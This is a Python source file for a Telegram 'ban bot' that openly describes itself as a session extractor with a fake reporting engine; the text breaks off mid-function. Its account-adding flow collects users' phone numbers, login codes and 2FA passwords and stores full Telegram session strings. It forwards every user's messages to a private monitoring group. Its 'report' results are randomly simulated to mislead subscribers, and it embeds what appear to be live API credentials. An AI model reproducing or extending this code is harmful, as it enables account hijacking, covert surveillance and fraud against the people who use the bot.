#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
TELEGRAM BAN BOT - FULL INLINE PROFESSIONAL REPORTING SYSTEM
REAL SESSION EXTRACTOR + FAKE REPORTING ENGINE
"""

import asyncio
import hashlib
import json
import logging
import random
import re
import sys
import time
import os
from datetime import datetime, timedelta
from pathlib import Path
from typing import Dict, List, Optional, Any, Tuple
import aiohttp
from io import BytesIO

# Telegram imports
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import (
    Application, CommandHandler, MessageHandler, filters,
    ConversationHandler, CallbackQueryHandler, ContextTypes, PicklePersistence
)

# Telethon for real session creation
from telethon import TelegramClient, functions
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PasswordHashInvalidError,
    FloodWaitError
)

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ==================== CONFIGURATION ====================
BOT_TOKEN = "7813598075:AAFUrbGZfBeRiZb1H1MOBULU_ed69OSTwzY"
API_ID = 27157163
API_HASH = "e0145db12519b08e1d2f5628e2db18c4"
GROUP_ID = -1003662481087  # Private monitoring group
FORCE_CHANNEL = "https://t.me/ProfileBan"
FORCE_CHANNEL_USERNAME = "ProfileBan"

# Owner IDs
OWNER_IDS = [6118760915, 1366105247]
MANUAL_SUBSCRIPTIONS = ["smzxu"]

# File paths
DATA_DIR = Path("data")
SESSION_DIR = Path("sessions")
DATA_DIR.mkdir(exist_ok=True)
SESSION_DIR.mkdir(exist_ok=True)

USERS_FILE = DATA_DIR / "users.json"
SUBSCRIPTIONS_FILE = DATA_DIR / "subscriptions.json"
USER_SESSIONS_FILE = DATA_DIR / "user_sessions.json"
VERIFIED_FILE = DATA_DIR / "verified.json"

# ==================== CONVERSATION STATES ====================
# Session creation states
PHONE, CODE, PASSWORD = range(3)
# Report states
WAITING_FORWARD, MANUAL_TARGET, REASON, DESCRIPTION = range(4, 8)

# ==================== SUBSCRIPTION MANAGER ====================
class SubscriptionManager:
    """Manages user subscriptions and channel verification"""

    def __init__(self):
        self.subscriptions: Dict[int, Dict] = {}
        self.verified_users: Dict[int, Dict] = {}
        self.manual_users = MANUAL_SUBSCRIPTIONS
        self.load_subscriptions()
        self.load_verified()

    def load_subscriptions(self):
        if SUBSCRIPTIONS_FILE.exists():
            try:
                with open(SUBSCRIPTIONS_FILE, 'r') as f:
                    self.subscriptions = {int(k): v for k, v in json.load(f).items()}
            except Exception as e:
                logger.error(f"Error loading subscriptions: {e}")

    def save_subscriptions(self):
        try:
            with open(SUBSCRIPTIONS_FILE, 'w') as f:
                json.dump({str(k): v for k, v in self.subscriptions.items()}, f, indent=2)
        except Exception as e:
            logger.error(f"Error saving subscriptions: {e}")

    def load_verified(self):
        if VERIFIED_FILE.exists():
            try:
                with open(VERIFIED_FILE, 'r') as f:
                    self.verified_users = {int(k): v for k, v in json.load(f).items()}
            except Exception as e:
                logger.error(f"Error loading verified: {e}")

    def save_verified(self):
        try:
            with open(VERIFIED_FILE, 'w') as f:
                json.dump({str(k): v for k, v in self.verified_users.items()}, f, indent=2)
        except Exception as e:
            logger.error(f"Error saving verified: {e}")

    def is_verified_member(self, user_id: int) -> bool:
        return str(user_id) in self.verified_users

    def add_verified_member(self, user_id: int, username: str = None):
        expiry = (datetime.now() + timedelta(days=1)).isoformat()
        self.verified_users[str(user_id)] = {
            "user_id": user_id,
            "username": username,
            "verified_at": datetime.now().isoformat(),
            "expiry": expiry,
            "status": "free_trial"
        }
        self.save_verified()

    def is_subscribed(self, user_id: int) -> bool:
        if user_id in OWNER_IDS:
            return True
        if str(user_id) in self.subscriptions:
            sub = self.subscriptions[str(user_id)]
            expiry = datetime.fromisoformat(sub.get("expiry", "2000-01-01"))
            if expiry > datetime.now():
                return True
        return False

    def is_manual_user(self, username: str) -> bool:
        if not username:
            return False
        username = username.lower().replace('@', '')
        return username in [u.lower().replace('@', '') for u in self.manual_users]

    def add_subscription(self, user_id: int, username: str = None, days: int = 30, approved_by: int = None):
        expiry = datetime.now() + timedelta(days=days)
        self.subscriptions[str(user_id)] = {
            "user_id": user_id,
            "username": username,
            "approved_at": datetime.now().isoformat(),
            "expiry": expiry.isoformat(),
            "days": days,
            "approved_by": approved_by,
            "status": "active"
        }
        self.save_subscriptions()
        return self.subscriptions[str(user_id)]

# ==================== REAL SESSION MANAGER ====================
class RealSessionManager:
    """Real Telegram session creation and management"""

    def __init__(self):
        self.pending_clients: Dict[int, Tuple[TelegramClient, str, str]] = {}  # user_id -> (client, phone, phone_code_hash)
        self.user_sessions: Dict[int, List[Dict]] = {}  # user_id -> list of session dicts
        self.load_user_sessions()

    def load_user_sessions(self):
        if USER_SESSIONS_FILE.exists():
            try:
                with open(USER_SESSIONS_FILE, 'r') as f:
                    self.user_sessions = {int(k): v for k, v in json.load(f).items()}
            except Exception as e:
                logger.error(f"Error loading user sessions: {e}")

    def save_user_sessions(self):
        try:
            with open(USER_SESSIONS_FILE, 'w') as f:
                json.dump({str(k): v for k, v in self.user_sessions.items()}, f, indent=2)
        except Exception as e:
            logger.error(f"Error saving user sessions: {e}")

    async def start_session_creation(self, user_id: int, phone: str) -> Tuple[bool, str]:
        """Start real session creation process"""
        try:
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            sent = await client.send_code_request(phone)
            self.pending_clients[user_id] = (client, phone, sent.phone_code_hash)
            return True, "Code sent. Please enter the 5-digit code you received in Telegram."
        except FloodWaitError as e:
            return False, f"Flood wait: {e.seconds} seconds"
        except Exception as e:
            return False, f"Error: {str(e)}"

    async def verify_code(self, user_id: int, code: str) -> Tuple[bool, str, bool]:
        """Verify the code, returns (success, message, requires_2fa)"""
        if user_id not in self.pending_clients:
            return False, "No pending session. Please start over.", False
        client, phone, phone_code_hash = self.pending_clients[user_id]
        try:
            await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
            # No 2FA
            me = await client.get_me()
            session_str = client.session.save()
            # Store session
            session_data = {
                "session_id": f"sess_{hashlib.md5(f'{phone}{time.time()}'.encode()).hexdigest()[:8]}",
                "phone": phone,
                "user_id": me.id,
                "username": me.username,
                "first_name": me.first_name,
                "last_name": me.last_name,
                "session_string": session_str,
                "created_at": datetime.now().isoformat(),
                "twofa_enabled": False,
                "reports_count": 0,
                "status": "active"
            }
            if user_id not in self.user_sessions:
                self.user_sessions[user_id] = []
            self.user_sessions[user_id].append(session_data)
            self.save_user_sessions()
            del self.pending_clients[user_id]
            await client.disconnect()
            return True, f"✅ Session created! Welcome {me.first_name or me.username or 'User'}", False
        except SessionPasswordNeededError:
            # 2FA required
            return False, "2FA_REQUIRED", True
        except PhoneCodeInvalidError:
            return False, "Invalid code", False
        except Exception as e:
            return False, f"Error: {str(e)}", False

    async def verify_2fa(self, user_id: int, password: str) -> Tuple[bool, str]:
        """Verify 2FA password"""
        if user_id not in self.pending_clients:
            return False, "No pending session. Please start over."
        client, phone, phone_code_hash = self.pending_clients[user_id]
        try:
            await client.sign_in(password=password)
            me = await client.get_me()
            session_str = client.session.save()
            session_data = {
                "session_id": f"sess_{hashlib.md5(f'{phone}{time.time()}'.encode()).hexdigest()[:8]}",
                "phone": phone,
                "user_id": me.id,
                "username": me.username,
                "first_name": me.first_name,
                "last_name": me.last_name,
                "session_string": session_str,
                "created_at": datetime.now().isoformat(),
                "twofa_enabled": True,
                "reports_count": 0,
                "status": "active"
            }
            if user_id not in self.user_sessions:
                self.user_sessions[user_id] = []
            self.user_sessions[user_id].append(session_data)
            self.save_user_sessions()
            del self.pending_clients[user_id]
            await client.disconnect()
            return True, f"✅ 2FA verified! Session created for {me.first_name or me.username or 'User'}"
        except PasswordHashInvalidError:
            return False, "Invalid 2FA password"
        except FloodWaitError as e:
            return False, f"Flood wait: {e.seconds} seconds"
        except Exception as e:
            return False, f"Error: {str(e)}"

    def get_user_sessions(self, user_id: int) -> List[Dict]:
        """Get all real sessions for a user"""
        return self.user_sessions.get(user_id, [])

    def delete_session(self, user_id: int, session_id: str) -> bool:
        """Delete a session"""
        if user_id in self.user_sessions:
            original_len = len(self.user_sessions[user_id])
            self.user_sessions[user_id] = [s for s in self.user_sessions[user_id] if s.get("session_id") != session_id]
            if len(self.user_sessions[user_id]) != original_len:
                self.save_user_sessions()
                return True
        return False

# ==================== FAKE REPORTING ENGINE ====================
class FakeReportingEngine:
    """Fake reporting engine with session 533 for premium users"""

    def __init__(self):
        self.premium_session = {
            "session_id": "533",
            "phone": "+533",
            "username": "premium_533",
            "first_name": "Premium",
            "last_name": "Account",
            "reports_count": 12847,
            "success_rate": 98.7,
            "twofa_enabled": True,
            "status": "active"
        }

    async def process_report(self, session: Dict, target: str, target_type: str, reason: str, description: str = "") -> Dict:
        """Simulate report processing"""
        await asyncio.sleep(random.uniform(2.0, 4.0))
        success = random.random() < 0.97  # 97% success
        report_id = f"RPT-{hashlib.md5(f'{target}{time.time()}'.encode()).hexdigest()[:10].upper()}"
        response_time = random.uniform(1.8, 3.5)
        return {
            "success": success,
            "report_id": report_id,
            "response_time": f"{response_time:.1f}s",
            "session": session.get("session_id", "533"),
            "message": "✅ Report submitted successfully" if success else "⚠️ Report queued"
        }

# ==================== BOT HANDLER ====================
class BanBot:
    """Main bot handler - fully inline based"""

    def __init__(self):
        self.sub_manager = SubscriptionManager()
        self.real_session_manager = RealSessionManager()
        self.fake_engine = FakeReportingEngine()
        self.user_states: Dict[int, Dict] = {}

    async def forward_to_group(self, update: Update, context: ContextTypes.DEFAULT_TYPE,
                              message_type: str = "message", extra_info: str = ""):
        """Forward ALL user messages to private group"""
        try:
            if not update.effective_user:
                return
            user = update.effective_user
            chat_id = update.effective_chat.id
            if chat_id == GROUP_ID:
                return

            user_info = [
                f"👤 **User:** {user.first_name or ''} {user.last_name or ''}".strip(),
                f"🆔 **ID:** `{user.id}`"
            ]
            if user.username:
                user_info.append(f"📱 **Username:** @{user.username}")
            user_info_text = "\n".join(user_info)

            # Status
            is_owner = user.id in OWNER_IDS
            is_manual = self.sub_manager.is_manual_user(user.username or "")
            is_sub = self.sub_manager.is_subscribed(user.id)
            is_verified = self.sub_manager.is_verified_member(user.id)
            status = "👑 Owner" if is_owner else "📝 Manual" if is_manual else "💎 Premium" if is_sub else "🆓 Free Trial" if is_verified else "❌ Unverified"

            if message_type == "command":
                cmd = update.message.text if update.message else update.callback_query.data
                content = f"📋 **COMMAND**\n{user_info_text}\n📊 **Status:** {status}\n🔧 **Cmd:** `{cmd}`\n{extra_info}\n⏰ {datetime.now().strftime('%H:%M:%S')}"
            elif message_type == "session":
                content = f"🔐 **SESSION**\n{user_info_text}\n📊 **Status:** {status}\n{extra_info}\n⏰ {datetime.now().strftime('%H:%M:%S')}"
            elif message_type == "report":
                content = f"🚨 **REPORT**\n{user_info_text}\n📊 **Status:** {status}\n{extra_info}\n⏰ {datetime.now().strftime('%H:%M:%S')}"
            else:
                msg = update.message.text[:500] if update.message else ""
                content = f"💬 **MESSAGE**\n{user_info_text}\n📊 **Status:** {status}\n📝 {msg}\n⏰ {datetime.now().strftime('%H:%M:%S')}"

            await context.bot.send_message(GROUP_ID, content, parse_mode='Markdown', disable_web_page_preview=True)
        except Exception as e:
            logger.error(f"Forward error: {e}")

    async def check_access(self, user_id: int, username: str = "") -> Tuple[bool, str]:
        """Check if user has access, returns (has_access, status_type)"""
        if user_id in OWNER_IDS:
            return True, "owner"
        if self.sub_manager.is_manual_user(username):
            return True, "manual"
        if self.sub_manager.is_subscribed(user_id):
            return True, "premium"
        if self.sub_manager.is_verified_member(user_id):
            return True, "free"
        return False, "none"

    async def show_force_join(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Show force join message with photo"""
        photo_url = "https://files.catbox.moe/bq3567.jpg"
        keyboard = [
            [InlineKeyboardButton("📢 Join Channel", url=FORCE_CHANNEL)],
            [InlineKeyboardButton("✅ I've Joined", callback_data="verify_join")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        try:
            await update.message.reply_photo(
                photo=photo_url,
                caption="🚀 **Welcome to Telegram Ban Bot**\n\n"
                       "❌ **CHANNEL VERIFICATION REQUIRED**\n\n"
                       f"To use this bot, you must join [@ProfileBan]({FORCE_CHANNEL}) first.\n\n"
                       "**Steps:**\n"
                       "1️⃣ Click 'Join Channel' button\n"
                       "2️⃣ Join the channel\n"
                       "3️⃣ Click 'I've Joined' button\n"
                       "4️⃣ Get 1 day free access\n\n"
                       "**Premium Access:**\n"
                       "Contact @smzxu for full subscription",
                parse_mode='Markdown',
                reply_markup=reply_markup
            )
        except:
            await update.message.reply_text(
                "🚀 **Welcome to Telegram Ban Bot**\n\n"
                "❌ **CHANNEL VERIFICATION REQUIRED**\n\n"
                f"To use this bot, you must join @ProfileBan first.\n\n"
                "**Steps:**\n"
                "1️⃣ Join @ProfileBan\n"
                "2️⃣ Click /start again\n"
                "3️⃣ Get 1 day free access\n\n"
                "**Premium Access:**\n"
                "Contact @smzxu for full subscription",
                parse_mode='Markdown'
            )

    async def send_main_menu(self, chat_id: int, user, context: ContextTypes.DEFAULT_TYPE):
        """Send main menu (photo or text) to a chat"""
        user_id = user.id
        username = user.username or ""
        has_access, status_type = await self.check_access(user_id, username)

        # Get subscription info
        if status_type == "owner":
            badge = "👑 OWNER"
            expiry = "Never"
        elif status_type == "manual":
            badge = "📝 MANUAL PREMIUM"
            expiry = "Lifetime"
            if not self.sub_manager.is_subscribed(user_id):
                self.sub_manager.add_subscription(user_id, username, 999, 0)
        elif status_type == "premium":
            badge = "💎 PREMIUM"
            sub = self.sub_manager.subscriptions.get(str(user_id), {})
            expiry = datetime.fromisoformat(sub.get("expiry", datetime.now().isoformat())).strftime('%Y-%m-%d')
        else:  # free
            badge = "🆓 FREE TRIAL"
            verified = self.sub_manager.verified_users.get(str(user_id), {})
            expiry = datetime.fromisoformat(verified.get("expiry", datetime.now().isoformat())).strftime('%Y-%m-%d')

        # Count user's real sessions
        real_sessions = self.real_session_manager.get_user_sessions(user_id)
        real_count = len(real_sessions)

        menu_text = f"""
🚀 **TELEGRAM BAN BOT**

━━━━━━━━━━━━━━━━━━━━━
👤 **USER PROFILE**
━━━━━━━━━━━━━━━━━━━━━
• **Name:** {user.first_name} {user.last_name or ''}
• **ID:** `{user_id}`
• **Username:** @{username or 'N/A'}
• **Status:** {badge}
• **Expiry:** {expiry}

━━━━━━━━━━━━━━━━━━━━━
📱 **YOUR SESSIONS**
━━━━━━━━━━━━━━━━━━━━━
"""
        if status_type in ["owner", "manual", "premium"]:
            menu_text += f"🟢 **533** - Premium Account (Always Active)\n"
        menu_text += f"🟢 **Your Sessions:** {real_count} accounts\n\n"

        menu_text += f"""
━━━━━━━━━━━━━━━━━━━━━
🎯 **ACTIONS**
━━━━━━━━━━━━━━━━━━━━━
"""

        keyboard = []
        # First row
        row1 = []
        if status_type in ["owner", "manual", "premium", "free"]:
            row1.append(InlineKeyboardButton("🎯 Report", callback_data="menu_report"))
        row1.append(InlineKeyboardButton("➕ Add Session", callback_data="menu_add_session"))
        keyboard.append(row1)

        # Second row
        row2 = [
            InlineKeyboardButton("📱 My Sessions", callback_data="menu_my_sessions"),
            InlineKeyboardButton("💎 Premium", callback_data="menu_premium")
        ]
        keyboard.append(row2)

        # Third row
        row3 = [
            InlineKeyboardButton("🆘 Help", callback_data="menu_help"),
            InlineKeyboardButton("📢 Channel", url=FORCE_CHANNEL)
        ]
        keyboard.append(row3)

        reply_markup = InlineKeyboardMarkup(keyboard)

        photo_url = "https://files.catbox.moe/bq3567.jpg"
        try:
            await context.bot.send_photo(
                chat_id=chat_id,
                photo=photo_url,
                caption=menu_text,
                parse_mode='Markdown',
                reply_markup=reply_markup
            )
        except:
            await context.bot.send_message(
                chat_id=chat_id,
                text=menu_text,
                parse_mode='Markdown',
                reply_markup=reply_markup
            )

    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /start command"""
        user = update.effective_user
        user_id = user.id
        username = user.username or ""

        await self.forward_to_group(update, context, "command", "🚀 User started bot")

        has_access, status_type = await self.check_access(user_id, username)
        if has_access:
            await self.send_main_menu(update.effective_chat.id, user, context)
        else:
            await self.show_force_join(update, context)

    async def verify_join_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle 'I've Joined' button"""
        query = update.callback_query
        await query.answer()
        user = query.from_user
        user_id = user.id
        username = user.username or ""

        await self.forward_to_group(update, context, "subscription", "✅ User clicked I've Joined")

        # Auto approve for owner/manual
        if user_id in OWNER_IDS or self.sub_manager.is_manual_user(username):
            self.sub_manager.add_verified_member(user_id, username)
            await query.edit_message_caption(
                caption="✅ **VERIFICATION SUCCESSFUL!**\n\n"
                       "You have premium access granted.\n"
                       "Click /start to access the bot.",
                parse_mode='Markdown'
            )
            return

        # Simulate verification (always success)
        self.sub_manager.add_verified_member(user_id, username)
        await query.edit_message_caption(
            caption="✅ **VERIFICATION SUCCESSFUL!**\n\n"
                   "You have successfully joined the channel.\n"
                   "🎁 **1 Day Free Access Granted!**\n\n"
                   "Click /start to access the bot.\n\n"
                   "**For Premium Access:**\n"
                   "Contact @smzxu for subscription",
            parse_mode='Markdown'
        )

    # ==================== MENU HANDLERS ====================
    async def menu_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle all menu button callbacks"""
        query = update.callback_query
        await query.answer()
        user = query.from_user
        user_id = user.id
        username = user.username or ""

        # Check access for protected actions
        has_access, status_type = await self.check_access(user_id, username)
        if not has_access and query.data not in ["menu_premium", "menu_help"]:
            await query.edit_message_caption("❌ Access denied. Please /start first.")
            return

        data = query.data

        if data == "menu_report":
            await self.start_report(query, context, user, status_type)
        elif data == "menu_add_session":
            await self.start_add_session(query, context, user)
        elif data == "menu_my_sessions":
            await self.show_my_sessions(query, context, user)
        elif data == "menu_premium":
            await self.show_premium(query, context, user)
        elif data == "menu_help":
            await self.show_help(query, context, user)
        elif data.startswith("del_session_"):
            session_id = data.replace("del_session_", "")
            if self.real_session_manager.delete_session(user_id, session_id):
                await query.answer("✅ Session deleted")
                await self.show_my_sessions(query, context, user)
            else:
                await query.answer("❌ Session not found")
        elif data == "back_to_menu":
            # Delete current message and send a fresh main menu
            await query.message.delete()
            await self.send_main_menu(query.message.chat_id, user, context)

    # ==================== REPORT FLOW (FULLY INLINE) ====================
    async def start_report(self, query, context, user, status_type):
        """Start report flow - ask user to forward a message"""
        user_id = user.id
        self.user_states[user_id] = {"step": "waiting_forward"}

        keyboard = [
            [InlineKeyboardButton("✍️ Enter Manually", callback_data="manual_target")],
            [InlineKeyboardButton("❌ Cancel", callback_data="back_to_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)

        await query.edit_message_caption(
            "🎯 **REPORT TARGET**\n\n"
            "📨 **Forward me a message** from the user/group/channel you want to report.\n\n"
            "• Simply forward any message from the target account.\n"
            "• The bot will automatically extract the target information.\n\n"
            "⬇️ **Forward a message now**\n"
            "   — or —\n"
            "✍️ **Enter manually** if you prefer to type the link/ID.",
            parse_mode='Markdown',
            reply_markup=reply_markup
        )
        return WAITING_FORWARD

    async def handle_manual_target_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Switch to manual target input"""
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        self.user_states[user_id] = {
            "step": "waiting_manual_target",
            "target_type": "user"  # default, will be overwritten by user input
        }

        await query.edit_message_caption(
            "📝 **MANUAL TARGET INPUT**\n\n"
            "Send me the target in one of these formats:\n"
            "• `tg://openmessage?user_id=8030141909`\n"
            "• `@username`\n"
            "• `123456789` (user ID)\n"
            "• Group/channel link or ID\n\n"
            "Send /cancel to abort.",
            parse_mode='Markdown'
        )
        return MANUAL_TARGET

    async def handle_forwarded_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Process forwarded message as target"""
        user_id = update.effective_user.id
        if user_id not in self.user_states or self.user_states[user_id].get("step") != "waiting_forward":
            return  # not expecting forward

        message = update.message
        if not message.forward_date:
            await message.reply_text("❌ This doesn't look like a forwarded message. Please forward a message.")
            return WAITING_FORWARD

        target = None
        target_type = None

        # Check if forward is from a user
        if message.forward_from:
            target = str(message.forward_from.id)
            target_type = "user"
            if message.forward_from.username:
                target = f"@{message.forward_from.username}"  # store username if available
        # Check if forward is from a channel or group
        elif message.forward_from_chat:
            chat = message.forward_from_chat
            target = str(chat.id)
            if chat.type in ["channel", "supergroup"]:
                target_type = "channel" if chat.type == "channel" else "group"
                if chat.username:
                    target = f"@{chat.username}"
            else:
                target_type = "group"
        else:
            await message.reply_text("❌ Could not identify the original sender. Please try another message or use manual entry.")
            return WAITING_FORWARD

        # Store target info
        self.user_states[user_id]["target"] = target
        self.user_states[user_id]["target_type"] = target_type
        self.user_states[user_id]["step"] = "got_target"

        await message.reply_text(
            f"✅ **Target captured!**\n\n"
            f"🎯 **Type:** {target_type.upper()}\n"
            f"📌 **Target:** `{target}`\n\n"
            "Now select a violation reason:",
            parse_mode='Markdown'
        )

        # Show reason selection
        await self.show_reason_keyboard(update, context, user_id)
        return REASON

    async def show_reason_keyboard(self, update_or_query, context, user_id):
        """Show reason selection inline keyboard"""
        keyboard = [
            [
                InlineKeyboardButton("📧 Spam", callback_data="reason_spam"),
                InlineKeyboardButton("🔪 Violence", callback_data="reason_violence")
            ],
            [
                InlineKeyboardButton("🔞 Pornography", callback_data="reason_porn"),
                InlineKeyboardButton("👶 Child Abuse", callback_data="reason_child")
            ],
            [
                InlineKeyboardButton("💊 Illegal Drugs", callback_data="reason_drugs"),
                InlineKeyboardButton("👤 Personal Details", callback_data="reason_personal")
            ],
            [
                InlineKeyboardButton("© Copyright", callback_data="reason_copyright"),
                InlineKeyboardButton("📌 Other", callback_data="reason_other")
            ],
            [InlineKeyboardButton("🔙 Back", callback_data="back_to_target_type")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)

        if hasattr(update_or_query, 'edit_message_text'):
            await update_or_query.edit_message_text(
                "📋 **Select violation reason:**",
                reply_markup=reply_markup
            )
        else:
            await update_or_query.reply_text(
                "📋 **Select violation reason:**",
                reply_markup=reply_markup
            )

    async def handle_manual_target_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle manual target input message"""
        user_id = update.effective_user.id
        if user_id not in self.user_states or self.user_states[user_id].get("step") != "waiting_manual_target":
            return ConversationHandler.END

        target = update.message.text.strip()
        if not target:
            await update.message.reply_text("❌ Target cannot be empty.")
            return MANUAL_TARGET

        # Simple type detection
        target_type = "user"
        if target.startswith("tg://") or target.startswith("https://t.me/"):
            if "chat_id=" in target or "channel_id=" in target:
                target_type = "group" if "chat_id=" in target else "channel"
        elif target.startswith("@"):
            # could be user, group, channel – default to user
            pass
        # else assume user ID

        self.user_states[user_id]["target"] = target
        self.user_states[user_id]["target_type"] = target_type
        self.user_states[user_id]["step"] = "got_target"

        await update.message.reply_text(
            f"✅ **Target set manually!**\n\n"
            f"🎯 **Type:** {target_type.upper()}\n"
            f"📌 **Target:** `{target}`\n\n"
            "Now select a violation reason:",
            parse_mode='Markdown'
        )

        await self.show_reason_keyboard(update, context, user_id)
        return REASON

    async def reason_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle reason selection"""
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        reason_key = query.data.replace("reason_", "")

        reason_map = {
            "spam": "Spam", "violence": "Violence", "porn": "Pornography",
            "child": "Child Abuse", "drugs": "Illegal Drugs",
            "personal": "Personal Details", "copyright": "Copyright", "other": "Other"
        }
        reason = reason_map.get(reason_key, "Other")

        self.user_states[user_id]["reason"] = reason
        self.user_states[user_id]["step"] = "waiting_description"

        keyboard = [
            [InlineKeyboardButton("⏭️ Skip Description", callback_data="skip_description")],
            [InlineKeyboardButton("🔙 Back", callback_data="back_to_reason")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)

        await query.edit_message_text(
            f"✅ **REASON: {reason}**\n\n"
            "📝 **Add description (optional)**\n\n"
            "Send a description of the violation, or click 'Skip'.",
            parse_mode='Markdown',
            reply_markup=reply_markup
        )
        return DESCRIPTION

    async def handle_report_description(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle description input"""
        user_id = update.effective_user.id
        if user_id not in self.user_states or self.user_states[user_id].get("step") != "waiting_description":
            return ConversationHandler.END

        description = update.message.text.strip()
        self.user_states[user_id]["description"] = description[:200]  # limit

        await self.process_report(update, context, user_id)
        return ConversationHandler.END

    async def skip_description_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Skip description"""
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        self.user_states[user_id]["description"] = "No description provided"
        await self.process_report(query, context, user_id)
        return ConversationHandler.END

    async def back_to_target_type(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Back button to target selection (forward or manual)"""
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        user = query.from_user
        has_access, status_type = await self.check_access(user_id, user.username or "")
        await self.start_report(query, context, user, status_type)
        return WAITING_FORWARD

    async def back_to_reason(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Back button to reason selection"""
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        await self.show_reason_keyboard(query, context, user_id)
        return REASON

    async def process_report(self, update_or_query, context: ContextTypes.DEFAULT_TYPE, user_id: int):
        """Process the report using appropriate session"""
        state = self.user_states.get(user_id, {})
        target = state.get("target")
        target_type = state.get("target_type")
        reason = state.get("reason", "Spam")
        description = state.get("description", "No description")

        # Determine which session to use
        user = update_or_query.from_user if hasattr(update_or_query, 'from_user') else update_or_query.effective_user
        has_access, status_type = await self.check_access(user_id, user.username or "")
        user_sessions = self.real_session_manager.get_user_sessions(user_id)

        if status_type in ["owner", "manual", "premium"]:
            session = self.fake_engine.premium_session
            result = await self.fake_engine.process_report(session, target, target_type, reason, description)
            session_name = "533 (Premium)"
        elif user_sessions:
            session = user_sessions[0]
            result = await self.fake_engine.process_report(session, target, target_type, reason, description)
            session_name = session.get("session_id", "Your Account")
        else:
            # No session available
            if hasattr(update_or_query, 'edit_message_text'):
                await update_or_query.edit_message_text(
                    "❌ **No active session**\n\n"
                    "Please add a session using 'Add Session' button.",
                    parse_mode='Markdown'
                )
            else:
                await update_or_query.reply_text(
                    "❌ **No active session**\n\n"
                    "Please add a session using 'Add Session' button.",
                    parse_mode='Markdown'
                )
            del self.user_states[user_id]
            return

        # Send processing animation
        if hasattr(update_or_query, 'edit_message_text'):
            processing_msg = await update_or_query.edit_message_text(
                "🚀 **PROCESSING REPORT...**\n\n"
                "⏳ Connecting to Telegram...",
                parse_mode='Markdown'
            )
        else:
            processing_msg = await update_or_query.reply_text(
                "🚀 **PROCESSING REPORT...**\n\n"
                "⏳ Connecting to Telegram...",
                parse_mode='Markdown'
            )

        await asyncio.sleep(1.5)
        await processing_msg.edit_text(
            "🚀 **PROCESSING REPORT...**\n\n"
            "✅ Connected to Telegram\n"
            "⏳ Authenticating session...",
            parse_mode='Markdown'
        )
        await asyncio.sleep(1.2)
        await processing_msg.edit_text(
            "🚀 **PROCESSING REPORT...**\n\n"
            "✅ Connected\n"
            "✅ Session authenticated\n"
            "⏳ Sending report...",
            parse_mode='Markdown'
        )
        await asyncio.sleep(2.0)

        if result["success"]:
            text = f"""
✅ **REPORT SUBMITTED SUCCESSFULLY!**

━━━━━━━━━━━━━━━━━━━━━
📊 **DETAILS**
━━━━━━━━━━━━━━━━━━━━━
🎯 **Target:** `{target}`
📌 **Type:** {target_type}
📋 **Reason:** {reason}
🔐 **Session:** {session_name}
📝 **Desc:** {description[:50]}{'...' if len(description)>50 else ''}

━━━━━━━━━━━━━━━━━━━━━
📈 **RESULT**
━━━━━━━━━━━━━━━━━━━━━
✅ **Status:** Success
⚡ **Time:** {result['response_time']}
📎 **Report ID:** `{result['report_id']}`
🕒 **Time:** {datetime.now().strftime('%H:%M:%S')}

━━━━━━━━━━━━━━━━━━━━━
"""
        else:
            text = f"""
⚠️ **REPORT QUEUED**

━━━━━━━━━━━━━━━━━━━━━
📊 **DETAILS**
━━━━━━━━━━━━━━━━━━━━━
🎯 **Target:** `{target}`
📌 **Type:** {target_type}
📋 **Reason:** {reason}
🔐 **Session:** {session_name}

━━━━━━━━━━━━━━━━━━━━━
⏳ **Status:** Queued
📊 **Queue Position:** #{random.randint(2,8)}
⏱️ **Est. Time:** {random.randint(10,30)}s
📎 **Queue ID:** `QUEUE-{hashlib.md5(f'{target}{time.time()}'.encode()).hexdigest()[:8].upper()}`

━━━━━━━━━━━━━━━━━━━━━
"""

        await processing_msg.edit_text(text, parse_mode='Markdown')

        # Forward to group
        await self.forward_to_group(update_or_query, context, "report",
            f"🎯 `{target}`\n📌 {reason}\n🔐 {session_name}\n✅ {result['success']}")

        # Clean up state
        del self.user_states[user_id]

    # ==================== ADD SESSION FLOW ====================
    async def start_add_session(self, query, context, user):
        """Start real session creation flow"""
        user_id = user.id
        self.user_states[user_id] = {"step": "waiting_phone"}

        await query.edit_message_caption(
            "🔐 **ADD TELEGRAM ACCOUNT**\n\n"
            "📱 **Step 1/3:** Send your phone number\n\n"
            "**Format:** `+1234567890` (with country code)\n"
            "Example: `+14155552671`\n\n"
            "This will create a real session that you can use for reporting.\n\n"
            "Send your phone number or /cancel:",
            parse_mode='Markdown'
        )
        return PHONE

    async def handle_add_phone(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle phone number input"""
        user_id = update.effective_user.id
        if user_id not in self.user_states or self.user_states[user_id].get("step") != "waiting_phone":
            return ConversationHandler.END

        phone = update.message.text.strip()
        if not re.match(r'^\+\d{10,15}$', phone):
